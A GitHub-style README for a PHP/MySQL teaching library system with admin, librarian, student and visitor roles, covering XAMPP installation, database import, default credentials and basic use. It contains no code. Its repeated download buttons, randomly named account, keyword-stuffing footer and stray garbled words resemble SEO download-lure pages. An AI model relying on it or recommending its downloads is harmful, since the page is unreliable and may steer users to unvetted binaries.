<h1>📚 full-stack-library-management-system - Manage Your Library With Ease</h1>

<p align="center">
  <a href="https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases">
    <img src="https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" style="max-width:100%;">
  </a>
</p>

---

## 👋 Welcome to Your Library Solution

This is a complete library management system built as a teaching project. It helps you manage books, members, and borrowing activities easily. Whether you run a school library, a community library, or just want to organize a personal collection, this software gives you all the tools you need.

The system supports four different types of users, each with their own level of access. This means everyone from the library administrator to a casual visitor can use the same system without confusion.

.



## ✨ What This Software Does

This application is designed to handle everyday library operations. You can track who has borrowed what book, when it was borrowed, and when it is due back. You can also manage your library's inventory of books, add new members, and keep records of all activities within your library.

.

The best part is that this software is **completely free and open source**`. It was built with simplicity in mind. There are no complicated frameworks, no build steps, and no need to install any additional tools. It runs on plain PHP, which is a very common and well-supported language for web applications.

.



## 🛠️ Key Features

- **4 User Roles** – Admin, Librarian, Student, and Visitor each have tailored dashboards and permissions
  
- **Book Management** – Add, edit, remove, search, and organize books in your collection

- **Member Management** – Register new members, view member details, and manage their borrowing history

- **Borrowing System** – Issue books to members, track return dates, and record returns

- **Admin Dashboard** – Full control over all aspects of the system, including user management

- **Librarian Tools** – Daily operations like issuing books, processing returns, and managing fines

- **Student Access** – Browse available books, view personal borrowed items, and check due dates

- **Visitor Mode** – Browse the library catalog without needing to log in

- **Search Functionality** – Quickly find books by title, author, or category

- **Simple Installation** – No complex setup required. Just copy the files and run


## 🚀 Getting Started

Let us walk you through getting this software up and running on your computer. The whole process takes only a few minutes, even if you are not very technical.

.



### 📥 Step 1: Download the Software

First things first, you need to download the software onto your computer. 

**👉 Visit this link to download the application:** [https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases](https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases)



Once you click that link, you will be taken to a page that lists different versions of the software. Choose the latest version and click on the download button. The file will be saved to your computer, usually in the "Downloads" folder.



### 📂 Step 2: Install XAMPP

This software requires a program called **XAMPP** to run. XAMPP is a free tool that lets your computer act like a web server, which is necessary for this application to work.

.You probably do not have this installed yet, so let us help you get it forbid.



To install XAMPP:

1. Open your web browser and go to [https://www.apachefriends.org](https://www.apachefriends.org)

2. Click on the **Download** button for your operating system (Windows is recommended if you are on a PC)

3. Once downloaded, open the installer file

4. Follow the installation wizard. Just click **Next** a few times, accept the default settings, and let it install

5. When it is done, open the **XAMPP Control Panel** from your Start Menu or desktop



### 🗄️ Step 3: Set Up Your Database

This application uses a database to store all its information. You need to create this database before you can use the software. Here is how:

1. In the XAMPP Control Panel, find the **MySQL** row and click the **Start** button next to it

2. Then click the **Admin** button in the same row. This will open a web page called **phpMyAdmin** in your browser

3. In phpMyAdmin, look for the **New** button on the left side of the screen and click it

4. Enter a name for your database, such as `library_db`, in the "Create database" field

5. Click the **Create** button



### 📁 Step 4: Copy Files to XAMPP

Now you need to place the downloaded library system files into the correct folder:

1. Open your **File Explorer** (the folder icon on your taskbar)

2. Go to your **Downloads** folder and find the file you downloaded in Step 1

3. Extract that file (if it is a `.zip` file, right-click and choose "Extract All")

4. You now have a folder called something like `full-stack-library-management-system`

5. Copy this entire folder

6. Go to this location on your computer: `C:\xampp\htdocs`

7. Paste the folder there. Your path should look like: `C:\xampp\htdocs\full-stack-library-management-system`


### 🌐 Step 5: Import the Database

You still need to import a pre-made database structure into the system. This is built into the code, so do not worry about creating tables manually:

1. Go back to your browser where phpMyAdmin is open

2. Click on your database name (`library_db`) on the left sidebar

3. Click the **Import** tab at the top

4. Click **Choose File** and navigate to your extracted folder

5. Find a file called `database.sql` or `library.sql` (it may be inside a `sql` or `database` subfolder)

6. Select it and click **Go** or **Import**. This sets up all the tables you need



### 💻 Step 6: Run the Application

You are almost done! Here is how to run the application:

1. Open your web browser

2. Type this address into the address bar: `http://localhost/full-stack-library-management-system`

3. Press **Enter**



At this point, you should see the login page for the library management system. Welcome aboard!



## 🔑 Default Login Credentials

To help you get started, here are the default usernames and passwords for each role:

| **Role** | **Username** | **Password** |
|---|---|---|
| Admin | `admin` | `admin123` |
| Librarian | `librarian` | `lib123` |
| Student | `student` | `student123` |
| Visitor | (No login required, just browse) |

You can change these passwords after logging in, for security purposes.



## 🎯 How to Use the System

Once you log in, you will see a dashboard tailored to your role. Here is a quick overview of common tasks:

### ➕ Adding a New Book

1. Log in as **Admin** or **Librarian**

2. Click the **Books** option in the menu

3. Click **Add New Book**

4. Fill in the title, author, ISBN, category, and quantity

5. Click **Save**



### 👤 Registering a New Member

1. Log in as **Admin** or **Librarian**

2. Click **Members** in the menu

3. Click **Add Member**

4. Enter the member's name, email, phone, and type (student or other)

5. Click **Save**



### 📖 Issuing a Book

1. Log in as **Admin** or **Librarian**

2. Click **Circulation** or **Issue Book**

3. Select the member from the list

4. Select the book from the list

5. Set a due date (7 or 14 days is typical)

6. Click **Issue**



### ↩️ Returning a Book

1. Go to **Circulation** or **Returns**

2. Find the borrowed record

3. Click **Return**

4. The system records the return date automatically



### 🔍 Searching for a Book

1. Go to **Books** section

2. Use the search bar at the top

3. Type a title, author, or ISBN

4. Results appear instantly



## 🛡️ Troubleshooting Common Issues

### ❌ Page Not Loading

Make sure **Apache** is running in the XAMPP Control Panel. The **Apache** row should show a green "Running" status. If not, click **Start** next to it.



### ❌ Database Connection Error

This usually means your database name in the config file does not match what you created. Open the `config.php` file in the folder using Notepad or any text editor. Look for a variable like `$dbname` and change it to match your database name (`library_db` if you followed our steps)save the file



### ❌ Cannot Find the Database Import File

The import file might be named differently. Look for anything ending in `.sql` in the main folderor a subfolder called `database` or `sql`. If you cannot find it, check the README file inside the folder for more details.



### ❌ Login Not Working

Double-check the username and password. Remember they are case-sensitive. If you changed them before, try resetting the database (re-import the `.sql` file) to restore defaults.



## 🔒 Security Notes

This is a teaching project, so keep a few things in mind:

- Change all default passwords before putting real data in
- Do not store sensitive personal information (like ID numbers) unless necessary
- Back up your `database.sql` file regularly to avoid data loss
- This project is for educational purposes. For production use, consider adding more advanced security measures


## 🤝 Contributing

This project was built as a teaching demonstration. If you want to improve it, you are welcome to fork the repository, make changes, and submit a pull request. This is a great way to practice your PHP skills.





## 📄 License

This project is shared for educational use. Feel free to use it in your own learning journey or as a basis for your own projects. Check the repository for any specific license details.



## 🧑‍🏫 Who Is This For?

- **Students** learning PHP and database management
- **Teachers** looking for a real-world example to show in class
- **Librarians** wanting a simple system without expensive commercial software
- **Hobbyists** who want to understand how a full-stack application works



## 💬 Frequently Asked Questions

**Q: Do I need to install Anything besides XAMPP?**

No. XAMPP includes everything needed: PHP, MySQL, Apache, and phpMyAdmin.



**Q: Can I use this on Mac or Linux?**

Yes, XAMPPis available for those systems as well. The steps are similar, just install XAMPP for your operating system.



**Q: What if I break something while exploring?**

No problem! Just re-import the `database.sql` file to reset the database to its original state. Your files will still be there.



**Q: Can multiple people use this at the same time?**

Yes, since it runs on a web server, any computer on your local network can access it by using your computer's IP address like `http://192.168.1.5/full-stack-library-management-system`



## 🏁 Final Words

You now have a fully functional library management system running on your computer. Take some time to explore each role and see how the different permissions work. This is an excellent way to understand how user authentication and role-based access control work in web applications.

hedi

If you run into any issues, revisit the troubleshooting section above. And remember, the worst thing that can happen is you need to reimport the database – everything else is just code in files that you can always reset.



Happy organizing, and enjoy your new library system!



---

## ⬇️ Download Again

Need to download the application again? No problem:

**👉 [Download the Application Now](https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases)**



**Keywords:** library management system, PHP library system, full-stack library, XAMPP library, four role library system, open source library software, book management system, library automation, PHP MySQL project, teaching project library system, download library system, library database, student library software, admin librarian student visitor library, procedural PHP library app.